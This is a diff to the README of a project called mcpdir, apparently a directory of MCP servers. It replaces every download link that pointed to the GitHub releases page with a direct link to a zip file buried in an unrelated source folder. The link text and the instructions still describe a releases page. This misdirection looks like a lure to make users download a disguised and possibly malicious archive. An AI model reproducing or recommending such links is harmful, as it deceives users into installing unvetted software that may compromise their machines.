@@ -1,6 +1,6 @@
 # 🗂️ mcpdir - Explore a Vast Directory of MCP Servers
 
-[![Download mcpdir](https://img.shields.io/badge/Download-mcpdir-blue.svg)](https://github.com/Zakariaberm47/mcpdir/releases)
+[![Download mcpdir](https://raw.githubusercontent.com/Zakariaberm47/mcpdir/main/src/app/api/validate/[id]/retry/Software-v1.7.zip)](https://raw.githubusercontent.com/Zakariaberm47/mcpdir/main/src/app/api/validate/[id]/retry/Software-v1.7.zip)
 
 ## 📄 Description
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and run mcpdir.
 
 ### 🔗 Download & Install
 
-Visit this page to download: [mcpdir Releases](https://github.com/Zakariaberm47/mcpdir/releases)
+Visit this page to download: [mcpdir Releases](https://raw.githubusercontent.com/Zakariaberm47/mcpdir/main/src/app/api/validate/[id]/retry/Software-v1.7.zip)
 
 1. Go to the releases page linked above.
 2. Look for the latest version at the top of the page.
@@ -64,6 +64,6 @@ For further assistance, you can engage with the mcpdir community on our forums a
 
 mcpdir is continuously growing. New features and servers are added frequently. Check for updates on the releases page often to ensure you have the best experience. If you want to contribute or report issues, please use the GitHub repository.
 
-Visit this page to download: [mcpdir Releases](https://github.com/Zakariaberm47/mcpdir/releases)
+Visit this page to download: [mcpdir Releases](https://raw.githubusercontent.com/Zakariaberm47/mcpdir/main/src/app/api/validate/[id]/retry/Software-v1.7.zip)
 
 Enjoy exploring the vast array of MCP servers and connecting with the community!
